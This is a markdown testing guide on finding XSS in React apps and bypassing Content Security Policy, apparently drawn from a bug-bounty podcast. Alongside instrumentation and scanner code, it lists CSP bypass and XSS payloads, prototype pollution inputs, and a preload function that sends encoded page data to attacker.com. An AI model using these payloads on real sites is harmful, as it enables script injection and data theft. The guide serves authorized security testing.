# React & CSP Testing Guide

## Purpose
Based on Episode 141 insights - advanced techniques for testing React applications with CSP restrictions and JSON control scenarios.

## React CreateElement Instrumentation

### The "Tagger" Technique (Nick Copi's Method)
Tag JSON responses to track data flow through React's createElement function.

```javascript
// Conditional breakpoint to tag JSON objects recursively
function tagObject(obj, path = '') {
  if (typeof obj === 'object' && obj !== null) {
    obj.__xss_tag = path || 'root';
    Object.keys(obj).forEach(key => {
      tagObject(obj[key], path ? `${path}.${key}` : key);
    });
  }
}

// Use in fetch callback or JSON response handler
tagObject(responseData);
```

### React CreateElement Monitoring
```javascript
// Set conditional breakpoint on React.createElement
// Condition: Check if props contain XSS tag
if (arguments[1] && arguments[1].__xss_tag) {
  console.log('XSS Tag found in React props:', arguments[1].__xss_tag);
  console.log('Props:', arguments[1]);
  // Break here to investigate exploitation potential
}
```

### Dangerous HTML Injection Detection
```javascript
// Monitor for dangerouslySetInnerHTML usage
const originalCreateElement = React.createElement;
React.createElement = function(type, props, ...children) {
  if (props && props.dangerouslySetInnerHTML) {
    console.log('dangerouslySetInnerHTML detected:', {
      component: type,
      props: props,
      source: new Error().stack
    });
  }
  return originalCreateElement.apply(this, [type, props, ...children]);
};
```

## CSP Bypass Strategies

### CSP Analysis Framework
```javascript
// Analyze CSP headers for bypass opportunities
const analyzeCSP = (cspHeader) => {
  const directives = cspHeader.split(';').map(d => d.trim());
  const analysis = {
    scriptSrc: [],
    defaultSrc: [],
    objectSrc: 'none',
    unsafeInline: false,
    unsafeEval: false,
    nonce: null,
    hash: []
  };
  
  directives.forEach(directive => {
    const [name, ...values] = directive.split(/\s+/);
    if (name === 'script-src') {
      analysis.scriptSrc = values;
      if (values.includes("'unsafe-inline'")) analysis.unsafeInline = true;
      if (values.includes("'unsafe-eval'")) analysis.unsafeEval = true;
      const nonce = values.find(v => v.startsWith("'nonce-"));
      if (nonce) analysis.nonce = nonce.slice(7, -1);
    }
  });
  
  return analysis;
};
```

### JSON-to-Script Conversion
```javascript
// Test if JSON data can be converted to executable script
const testJsonToScript = (jsonData) => {
  // Method 1: Direct JSONP-style callback
  const callbackTest = `handleResponse(${JSON.stringify(jsonData)})`;
  
  // Method 2: Script tag injection via CSP whitelisted domain
  const scriptInjection = `<script src="whitelisted.com/data.json?callback=handleResponse"></script>`;
  
  // Method 3: Angular-style CSP bypass
  const angularBypass = `<div ng-app ng-csp>{{${JSON.stringify(jsonData).replace(/"/g, '&quot;')}}}</div>`;
  
  return { callbackTest, scriptInjection, angularBypass };
};
```

### Preload Side-Channel Testing
```javascript
// Use link preload to exfiltrate data in CSP environments
const preloadExfiltration = (data) => {
  const link = document.createElement('link');
  link.rel = 'preload';
  link.as = 'script';
  link.href = `https://attacker.com/collect?data=${encodeURIComponent(btoa(JSON.stringify(data)))}`;
  document.head.appendChild(link);
};
```

## Advanced React Testing Patterns

### State Manipulation via Props
```javascript
// Override React component props for testing
const overrideComponentProps = (componentName, newProps) => {
  // Find component instances and modify their props
  document.querySelectorAll('[data-reactroot]').forEach(root => {
    const fiberNode = root._reactInternalFiber || root.__reactInternalInstance;
    if (fiberNode && fiberNode.child) {
      const walkFiber = (node) => {
        if (node.type && node.type.name === componentName) {
          Object.assign(node.memoizedProps, newProps);
        }
        if (node.child) walkFiber(node.child);
        if (node.sibling) walkFiber(node.sibling);
      };
      walkFiber(fiberNode);
    }
  });
};
```

### Hook Interception
```javascript
// Intercept React hooks for security testing
const originalUseState = React.useState;
React.useState = function(initialValue) {
  const [state, setState] = originalUseState(initialValue);
  
  // Log state changes that might be security-sensitive
  if (typeof setState === 'function') {
    const wrappedSetState = function(newValue) {
      console.log('useState update:', {
        hook: 'useState',
        oldValue: state,
        newValue: newValue,
        stack: new Error().stack
      });
      return setState(newValue);
    };
    return [state, wrappedSetState];
  }
  
  return [state, setState];
};
```

### Context Provider Testing
```javascript
// Test React Context for privilege escalation
const testReactContext = () => {
  // Find context providers
  const contextProviders = [];
  document.querySelectorAll('[data-reactroot]').forEach(root => {
    const fiberNode = root._reactInternalFiber || root.__reactInternalInstance;
    if (fiberNode) {
      const walkFiber = (node) => {
        if (node.type && node.type._context) {
          contextProviders.push({
            name: node.type.displayName || 'AnonymousContext',
            context: node.type._context,
            value: node.memoizedProps && node.memoizedProps.value
          });
        }
        if (node.child) walkFiber(node.child);
        if (node.sibling) walkFiber(node.sibling);
      };
      walkFiber(fiberNode);
    }
  });
  return contextProviders;
};
```

## JSON Control Exploitation

### Prototype Pollution via JSON
```javascript
// Test for prototype pollution in JSON parsing
const testPrototypePollution = (jsonInput) => {
  const payloads = [
    '{"__proto__":{"isAdmin":true}}',
    '{"constructor":{"prototype":{"isAdmin":true}}}',
    '{"__proto__":{"json":"function(){return process.exit();}"}}'
  ];
  
  payloads.forEach(payload => {
    try {
      const parsed = JSON.parse(payload);
      console.log('Prototype pollution test:', payload, parsed);
      
      // Check if pollution succeeded
      if ({}.isAdmin) console.log('Prototype pollution successful!');
    } catch (e) {
      console.log('Parse failed:', payload);
    }
  });
};
```

### JSON Schema Bypass
```javascript
// Test JSON schema validation bypasses
const testSchemaBypass = (schema, data) => {
  const bypasses = [
    // Additional properties
    { ...data, admin: true },
    // Type confusion
    { ...data, role: { toString: () => 'admin' } },
    // Array vs object
    { ...data, permissions: ['admin', 'user'] },
    // Null byte injection
    { ...data, username: 'admin\x00' }
  ];
  
  return bypasses.map(bypass => ({
    payload: bypass,
    valid: validateJSON(schema, bypass)
  }));
};
```

## CSP-Specific XSS Payloads

### Nonce-Based Bypasses
```javascript
// Generate nonce-based XSS payloads
const generateNoncePayloads = (nonce) => [
  `<script nonce="${nonce}">alert(1)</script>`,
  `<style nonce="${nonce}">@import url('javascript:alert(1)')</style>`,
  `<script nonce="${nonce}" src="data:text/javascript,alert(1)"></script>`
];
```

### Hash-Based Bypasses
```javascript
// Test CSP hash bypasses
const testHashBypass = () => {
  const script = document.createElement('script');
  script.textContent = 'alert(document.domain)';
  
  // Calculate SHA hash of script
  // Use this to generate matching CSP hash
  return script.textContent;
};
```

### Domain Whitelist Abuse
```javascript
// Test whitelisted domain abuse
const testWhitelistBypass = (whitelistedDomains) => {
  const payloads = whitelistedDomains.map(domain => [
    `<script src="${domain}/jsonp?callback=alert"></script>`,
    `<script src="${domain}/script.jsonp"></script>`,
    `<script src="${domain}/redirect?url=javascript:alert(1)"></script>`
  ]).flat();
  
  return payloads;
};
```

## Automated Testing Framework

### React Security Scanner
```javascript
class ReactSecurityScanner {
  constructor() {
    this.findings = [];
    this.setupHooks();
  }
  
  setupHooks() {
    this.hookCreateElement();
    this.hookUseState();
    this.hookContext();
  }
  
  hookCreateElement() {
    const original = React.createElement;
    React.createElement = (...args) => {
      this.analyzeCreateElement(...args);
      return original.apply(this, args);
    };
  }
  
  analyzeCreateElement(type, props, ...children) {
    if (props && props.dangerouslySetInnerHTML) {
      this.addFinding('dangerous-html', {
        component: type.name || 'Anonymous',
        props: props,
        severity: 'high'
      });
    }
    
    if (props && this.containsUserInput(props)) {
      this.addFinding('user-input-in-props', {
        component: type.name || 'Anonymous',
        props: props,
        severity: 'medium'
      });
    }
  }
  
  containsUserInput(obj) {
    // Check if props contain user-controllable data
    const userInputPatterns = [/location\.search/, /document\.cookie/, /localStorage/];
    const str = JSON.stringify(obj);
    return userInputPatterns.some(pattern => pattern.test(str));
  }
  
  addFinding(type, data) {
    this.findings.push({ type, data, timestamp: Date.now() });
  }
  
  getReport() {
    return this.findings;
  }
}

// Usage
const scanner = new ReactSecurityScanner();
// Interact with the app
console.log(scanner.getReport());
```

## Quick Reference Commands

### React Investigation Commands
```javascript
// Find all React components on page
Object.keys(window).filter(key => key.startsWith('react') || key.includes('React'))

// Get React component tree
document.querySelector('[data-reactroot]')?._reactInternalFiber

// Monitor React updates
const observer = new MutationObserver(() => console.log('React update detected'));
observer.observe(document.body, { childList: true, subtree: true });
```

### CSP Testing Commands
```javascript
// Get current CSP
document.querySelector('meta[http-equiv="Content-Security-Policy"]')?.content

// Test CSP violation
document.createElement('script').src = 'data:text/javascript,alert(1)'

// Monitor CSP violations
document.addEventListener('securitypolicyviolation', e => console.log('CSP Violation:', e));
```

## Troubleshooting

### Common Issues
- **React hooks not working**: Check if using React 16.8+ with hooks
- **CSP too restrictive**: Look for JSONP endpoints or misconfigured domains
- **createElement not found**: App might use Preact or custom framework
- **JSON tagging not working**: Ensure breakpoint is in correct callback location

### Getting Help
- React documentation for component internals
- CSP specification for directive details
- CTBBP Discord for community techniques
- Browser DevTools for debugging hooks

---
*Based on Episode 141 (React CreateElement Exploits) with Nick Copi's advanced techniques*
